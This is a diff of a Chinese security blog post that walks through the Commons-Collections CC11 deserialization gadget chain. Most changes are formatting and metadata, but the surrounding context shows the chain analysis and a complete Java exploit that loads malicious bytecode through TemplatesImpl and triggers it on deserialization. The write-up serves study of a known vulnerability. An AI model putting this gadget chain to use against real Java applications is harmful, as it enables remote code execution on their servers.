@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087513248-dcd832e1-3f04-4b68-8883-2b1575f1c254.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087717823-53707e86-aabb-4303-acf0-809ad9fa22f9.png">
 <meta property="article:published_time" content="2025-03-04T11:36:35.803Z">
-<meta property="article:modified_time" content="2025-03-04T11:40:50.350Z">
+<meta property="article:modified_time" content="2025-03-24T04:22:46.607Z">
 <meta property="article:author" content="Sean">
 <meta property="article:tag" content="CC链">
 <meta name="twitter:card" content="summary">
@@ -149,6 +149,8 @@
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">Sean</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -156,7 +158,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -167,7 +169,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -197,7 +199,7 @@
     <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/04/CC11%E9%93%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="Sean">
     </span>
 
@@ -222,9 +224,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-04 19:36:35 / 修改时间：19:40:50" itemprop="dateCreated datePublished" datetime="2025-03-04T19:36:35+08:00">2025-03-04</time>
+      <time title="创建时间：2025-03-04 19:36:35" itemprop="dateCreated datePublished" datetime="2025-03-04T19:36:35+08:00">2025-03-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-24 12:22:46" itemprop="dateModified" datetime="2025-03-24T12:22:46+08:00">2025-03-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -284,25 +292,25 @@ CC6链流程
 <p>感觉CC6这里没有很熟练，将流程再分析一下</p>
 </blockquote>
 <h5 id="IWrdr">调用chainedTransformer.transformer</h5>
-调用transformer方法，这里用`LazyMap.get`去触发
 
+<p>调用transformer方法，这里用<code>LazyMap.get</code>去触发</p>
 <p>从<code>get</code>方法中可以发现<code>factory.transform</code>的factory是可以在构造函数中赋值的，因此对于我们是可控的</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <h5 id="kEVmU">调用get方法</h5>
-这里使用`TiedMapEntry`的`getValue`方法，我们可以从构造方法中看到map和key都是可控的
 
+<p>这里使用<code>TiedMapEntry</code>的<code>getValue</code>方法，我们可以从构造方法中看到map和key都是可控的</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <h5 id="Vemi5">调用getValue</h5>
-`getValue`方法，我们可以从本类的`hashCode`方法中找到调用
 
+<p><code>getValue</code>方法，我们可以从本类的<code>hashCode</code>方法中找到调用</p>
 <p>且该方法我们想到可以使用<code>HashMap</code>作为入口，这里<code>HashMap</code>入口调用<code>hashCode</code>不在赘述</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="XWg9m">EXP编写</h4>
-这里我们的EXP就已经写完了，但是我们发现在`put`时，就已经触发了计算器，是因为在put时也会触发其`hashCode`方法我们也和CC6一样，先改为无用的东西，后面通过反射调用
 
+<p>这里我们的EXP就已经写完了，但是我们发现在<code>put</code>时，就已经触发了计算器，是因为在put时也会触发其<code>hashCode</code>方法我们也和CC6一样，先改为无用的东西，后面通过反射调用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>通过修改以后，我们的代码就可以成功序列化，并在反序列化执行恶意类加载</p>
@@ -369,7 +377,6 @@ CC6链流程
     </footer>
   </article>
 </div>
-
 
 
 
